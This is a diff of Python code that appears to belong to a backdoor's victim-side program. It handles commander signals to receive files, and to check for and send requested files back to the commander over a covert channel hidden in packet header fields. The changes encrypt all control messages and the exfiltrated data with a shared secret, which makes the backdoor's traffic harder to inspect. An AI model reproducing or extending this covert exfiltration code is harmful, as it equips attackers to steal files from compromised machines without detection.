@@ -221,14 +221,14 @@ if __name__ == '__main__':
                                             constants.WATCH_FILE_NOT_EXIST_TO_CMDR.format(file_path)).encode())
 
 # e) Receive File from Commander (Covert Channel)
-                if data.decode() == constants.TRANSFER_FILE_SIGNAL:
+                if decrypted_data == constants.TRANSFER_FILE_SIGNAL:
                     print(constants.CLIENT_RESPONSE.format(constants.TRANSFER_FILE_SIGNAL))
 
                     # Send an initial acknowledgement to the client (giving them green light for transfer)
-                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
+                    client_socket.send(encrypt_string(constants.RECEIVED_CONFIRMATION_MSG, shared_secret).encode())
 
                     # Get configuration from commander (filename, header, header_field)
-                    res = client_socket.recv(1024).decode().split("/")
+                    res = decrypt_string(client_socket.recv(1024).decode(), shared_secret).split("/")
                     filename = res[0]
                     choices = (res[1], res[2])  # => (header, header_field)
 
@@ -242,14 +242,15 @@ if __name__ == '__main__':
                                         source_ip, source_port, shared_secret, choices, filename)
 
 # f) Transfer file to Commander
-                if data.decode() == constants.GET_FILE_SIGNAL:
+                if decrypted_data == constants.GET_FILE_SIGNAL:
                     print(constants.CLIENT_RESPONSE.format(constants.GET_FILE_SIGNAL))
 
                     # Send ACK
-                    client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
+                    client_socket.send(encrypt_string(constants.RECEIVED_CONFIRMATION_MSG, shared_secret).encode())
 
                     # Wait Response: Receive File Path + Covert Channel Config (Header + Field)
-                    file_path, header, field, cmdr_port = client_socket.recv(1024).decode().split("/")
+                    file_path, header, field, cmdr_port = decrypt_string(client_socket.recv(1024).decode(),
+                                                                         shared_secret).split("/")
 
                     # CHECK: If destination field choice, do nothing
                     if constants.DESTINATION_ADDRESS_FIELD == field:
@@ -259,11 +260,11 @@ if __name__ == '__main__':
                     # If exists, then initiate file transfer
                     if os.path.exists(file_path):
                         transfer_file_covert_helper_print_config(file_path, header, field)
-                        client_socket.send(constants.GET_FILE_EXIST.encode())
+                        client_socket.send(encrypt_string(constants.GET_FILE_EXIST, shared_secret).encode())
                         transfer_file_covert(client_socket, client_address[0], int(cmdr_port),
-                                             source_port, (header, field), file_path)
+                                             source_port, (header, field), file_path, shared_secret)
                     else:
-                        client_socket.send(constants.GET_FILE_NOT_EXIST.encode())
+                        client_socket.send(encrypt_string(constants.GET_FILE_NOT_EXIST, shared_secret).encode())
                         print(constants.FILE_NOT_FOUND_ERROR.format(file_path))
                         print(constants.AWAIT_NEXT_OP_MSG)
                         print(constants.MENU_CLOSING_BANNER)
